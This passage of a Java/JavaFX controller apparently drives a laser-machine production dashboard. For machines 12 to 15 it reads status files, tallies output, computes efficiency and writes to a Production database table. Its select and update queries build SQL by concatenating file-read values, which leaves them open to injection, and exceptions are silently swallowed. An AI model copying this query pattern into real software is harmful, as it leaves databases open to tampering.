                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine12.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine12.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
              //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine12.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine12.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe12.txt"));
             summe12=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine12.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog111.setText(Integer.toString(sum-summe12));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }  

//nog111.setText("N/A");
//nog111.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane12.setStyle("-fx-background-color:orange;");
              eff111.setText("0%");
          }
          
          else {
              
                vboxpane12.setStyle("-fx-background-color:transparent;");
                long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff111.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff111.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff111.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff111.setText("N/A");
          }
          
            
          }
          
          
        
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg12.delete();
        }  
            
            workingmachinesno=workingmachinesno+1;
            
        }
    else { 
        /////////////////////// Machine 12 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno111.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno111.setText("Machine   "+machine_number12);
        nog111.setText("0");
        eff111.setText("0%");
        mod111.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod111.setText("Machine isn't working");
        unit111.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit111.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
    
     
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh111.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
        
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
//       
    
        
    refresh112.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 13 ////////////////////////////
      String machine_number13="13";  
//      String poth13 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth13=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg13=new File (poth+"\\Machine13.kady");
        if (lkg13.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg13));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno112.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod112.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit112.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod112.setText(v5);
           unit112.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine13.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
           areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine13.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine13.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine13.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine13.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe13.txt"));
             summe13=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine13.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog112.setText(Integer.toString(sum-summe13));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }  

//nog112.setText("N/A");
//nog112.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          
          long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane13.setStyle("-fx-background-color:orange;");
              eff112.setText("0%");
          }
          
          else {
              
                vboxpane13.setStyle("-fx-background-color:transparent;");
              
               long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff112.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff112.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff112.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff112.setText("N/A");
          }
          }
          
          
       
          
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg13.delete();
        }  
            
            workingmachinesno=workingmachinesno+1;
            
        }
    else { 
        /////////////////////// Machine 13 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno112.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno112.setText("Machine   "+machine_number13);
        nog112.setText("0");
        eff112.setText("0%");
        mod112.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod112.setText("Machine isn't working");
        unit112.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit112.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
    
     
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh112.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
        
        
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
    
        
        
    
    refresh113.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 14 ////////////////////////////
      String machine_number14="14";  
//      String poth14 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth14=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg14=new File (poth+"\\Machine14.kady");
        if (lkg14.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg14));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno113.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod113.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit113.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod113.setText(v5);
           unit113.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine14.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
            areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine14.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine14.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine14.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine14.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe14.txt"));
             summe14=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine14.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog113.setText(Integer.toString(sum-summe14));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }  


//nog113.setText("N/A");
//nog113.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          
          long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane14.setStyle("-fx-background-color:orange;");
              eff113.setText("0%");
          }
          
          else {
              
                vboxpane14.setStyle("-fx-background-color:transparent;");
              
             long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff113.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff113.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff113.setText(Integer.toString(percentago)+"%");
          }
          else {
              eff113.setText("N/A");
          }
          
          }
          
         
          /////////////////////////////////////////////////////////////////////////////////////////////
             
             
             
             
               try {
      
   String num,idd,initt,endd,modely,unity;
   num=v1;
   idd=v2;
   initt=v3;
   endd=v4;
   modely=v5;
   unity=v6;   conn_write=db_writer.java_db();
      
     
      String sqlor = "select * from Production where Machine_Number like '"+num+"' and Machine_ID like '"+idd+"' and Init_Date like '"+initt+"' ";
      pst_write = conn_write.prepareStatement(sqlor);
      rs_write = pst_write.executeQuery();
      if (rs_write.next()) {
      //Yes - Update
      //////////////////Update/////////////////////
      String sql1 = "update Production set Machine_Number='"+num+"', Machine_ID='"+idd+"', Init_Date='"+initt+"', End_Date='"+endd+"', Model='"+modely+"', Unit='"+unity+"' where Machine_Number='"+num+"' and Machine_ID='"+idd+"' and Init_Date='"+initt+"' ";
      pst_write = conn_write.prepareStatement(sql1);
      pst_write.execute();
    }
    else {       
     //no - insert
     //////////////////Insert///////////////////// 
      String sql2s = "insert into Production (Machine_Number, Machine_ID, Init_Date, End_Date, Model, Unit) values (?,?,?,?,?,?)";
      pst_write = conn_write.prepareStatement(sql2s);
      pst_write.setString(1,num);
      pst_write.setString(2,idd);
      pst_write.setString(3,initt);
      pst_write.setString(4,endd);
      pst_write.setString(5,modely);
      pst_write.setString(6,unity);
      pst_write.execute();
    }
     
      }
      
   catch (Exception exception) {
      
    } 
      
      finally {
      try {
          
conn_write.close();
           rs_write.close();
           pst_write.close();
          
      } catch (Exception exception) {
      }
    } 
         
        ////////////////////////////////////////////////////////////////////END////////////////////////////////////////////////////////////////////////////////
           
           
           
           
           
           //buffr.close();
          } catch (FileNotFoundException ex) {    
        } catch (IOException ex) {
            
            lkg14.delete();
        }  
            
            workingmachinesno=workingmachinesno+1;
            
        }
    else { 
        /////////////////////// Machine 14 ////////////////////////////
        //Noti, that we don't have information for this machine //So, it not working
        //Set model not working and everything zero, write in red.
        //System.out.println("We don't have info for this machine, it's not working.");
        mno113.setStyle("-fx-font-weight:bold; -fx-background-color:red; -fx-background-radius:1em; -fx-font-size:20;");
        mno113.setText("Machine   "+machine_number14);
        nog113.setText("0");
        eff113.setText("0%");
        mod113.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:23; -fx-text-fill:red;");
        mod113.setText("Machine isn't working");
        unit113.setStyle("-fx-background-color:red; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
        unit113.setText("0");
        ///////////////////////////////////////////////////////////////    
    }
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
      
    
     
     try {            Thread.sleep(500);        } catch (InterruptedException ex) {            Logger.getLogger(ViewerController_New.class.getName()).log(Level.SEVERE, null, ex);        }
 
     refresh113.setStyle("-fx-background-color:transparent;");
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
        
        
//    }
//    }).start(); 
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    
//    new Thread(new Runnable() {
//    @Override
//    public void run() {
       
    
        
    
    refresh114.setStyle("-fx-background-color:green;");
     /////////////////////// Machine 15 ////////////////////////////
      String machine_number15="15";  
//      String poth15 = null;
//        try {
//           BufferedReader buffr; buffr = new BufferedReader (new FileReader ("File_Des.kady"));
//           poth15=buffr.readLine();
//           buffr.close();
//          } catch (FileNotFoundException ex) {    
//        } catch (IOException ex) {
//        } 
        File lkg15=new File (poth+"\\Machine15.kady");
        if (lkg15.exists()) {
            try {
           BufferedReader buffr; buffr = new BufferedReader (new FileReader (lkg15));
           String v1=buffr.readLine().replace("Number=","");
           String v2=buffr.readLine().replace("ID=","");
           String v3=buffr.readLine().replace("Init=","");
           String v4=buffr.readLine().replace("End=","");
           String v5=buffr.readLine().replace("Model=","");
           String v6=buffr.readLine().replace("Unit=","");
           String v7=buffr.readLine().replace("Laser_Time=","");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mno114.setStyle("-fx-font-weight:bold; -fx-background-color:#93d7f3; -fx-background-radius:1em; -fx-font-size:20;");
           mod114.setStyle("-fx-background-color:transparent; -fx-font-weight:bold; -fx-font-size:20; -fx-text-fill:black;");
           unit114.setStyle("-fx-background-color:#00bff3; -fx-text-fill:black; -fx-font-weight:bold; -fx-font-size:30;");
           ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
           mod114.setText(v5);
           unit114.setText(v6);
           
            buffr.close();
            /////////////////////////////////////Write To DB/////////////////////////////START////////////////////////////////////////////////////////////////////
           
            areatoupdate.clear();
            
           File hn=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");
           if (!hn.exists()) {
               hn.mkdirs();
           }
           else {
               
           }
           File cx=new File (hn+"\\Machine15.txt");
           if (!cx.exists()) {
               cx.createNewFile();
           }
           else {
               
           }
           
           BufferedReader bui=new BufferedReader (new FileReader (cx));
           String line;
           while ((line=bui.readLine())!=null) {
               
            areatoupdate.appendText(line+"   ");
               
           }
           bui.close();
           
           
           
            String texttoupdate=areatoupdate.getText().replaceAll("   ", "\n");
            String comm=v3+"/"+v5;
             
             if (texttoupdate.contains(comm)) {
                   
                    //Update
                    String title = StringUtils.substringBetween(texttoupdate, comm+"=", "\n");  //Number only (old)
                    String allold=comm+"="+title;  //old 
                    String allnew=comm+"="+v6;  //new
                    String input=texttoupdate.replace(allold,allnew);
                    PrintWriter pnm=new PrintWriter (new FileWriter (hn+"\\Machine15.txt"));
                    pnm.println(input);
//                    FileOutputStream File = new FileOutputStream(hn+"\\Machine1.txt");
//                    File.write(input.getBytes());
                    pnm.close();
                    areatoupdate.clear();


                   
               }
               else {
                   
                   //Write or append
                   
                   try {
                       
                       Path path = Paths.get(hn+"\\Machine15.txt");
                       Files.write(path, Arrays.asList(v3+"/"+v5+"="+v6), StandardCharsets.UTF_8,
                       Files.exists(path) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE);
                       } 
                       catch (IOException ioe) {
                       }
                   
               }
             
             //////////////////////////////////////Read Here then remove empty lines then write again//////////////////////////////////////////////
             
             readwrite.clear();
             BufferedReader no=new BufferedReader (new FileReader (hn+"\\Machine15.txt"));
             String lc;
             while ((lc=no.readLine())!=null) {
                if (lc.isEmpty()) {
                }
                else {
                readwrite.appendText(lc+"\n");
                }}
             no.close();
             
             ///////Write//////
             
             String qw=readwrite.getText();
             PrintWriter ndk=new PrintWriter (new FileWriter (hn+"\\Machine15.txt"));
             ndk.println(qw);
             ndk.close();
             
             //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
             BufferedReader wq=new BufferedReader(new FileReader (System.getProperty("user.home")+"\\Laser_Shifts\\summe15.txt"));
             summe15=Integer.parseInt(wq.readLine());
             wq.close();
               try {
              
             File hnu=new File (System.getProperty("user.home")+"\\Laser_Daily_Production");  
             //////////////////////// 
             BufferedReader bd=new BufferedReader (new FileReader (hnu+"\\Machine15.txt"));
             String lop;
             int sum = 0;
             while ((lop=bd.readLine())!=null) {
                 
                 if (lop.isEmpty()) {
                     
                 }
                 
                 else {
                     String requiredString = lop.substring(lop.indexOf("=") + 1 , lop.length());
             int num = Integer.parseInt(requiredString);
             sum += num;
                 }
                 
             
             }
             nog114.setText(Integer.toString(sum-summe15));
             //System.out.println(sum);
             bd.close();
             /////////////////////////
             
            // nog1.setText("dd");  
              
          }  
          
          catch (Exception k) {
              
          }  


//nog114.setText("N/A");
//nog114.setTooltip(new Tooltip("Click Here To Show Shift Capasity For This Machine!"));
               
               
          //////////////////////////////////Create Performance Here////////////////////////////////////
          long lasetimy=Long.parseLong(v7);
          if (lasetimy==0) {
              
              //Machine stopped.
              
                vboxpane15.setStyle("-fx-background-color:orange;");
              eff114.setText("0%");
          }
          
          else {
              
                vboxpane15.setStyle("-fx-background-color:transparent;");
              
              long lasetime=Long.parseLong(v7);
          long unito=Long.parseLong(v6);
          if (unito==0) {
              unito=unito+1;
          } 
            
          else {
              
          }
          long unita=unito*1000;
          double onegarmenttakes=lasetime/unita;
          if (onegarmenttakes>0&&onegarmenttakes<=30) {
              double newonegarmenttakes=onegarmenttakes+3;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff114.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>30&&onegarmenttakes<=50) {
              double newonegarmenttakes=onegarmenttakes+5;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
              eff114.setText(Integer.toString(percentago)+"%");
          }
          else if (onegarmenttakes>50) {
              double newonegarmenttakes=onegarmenttakes+7;
              double p1=onegarmenttakes*100;
              double p2=p1/newonegarmenttakes;
              int percentago=(int)p2;
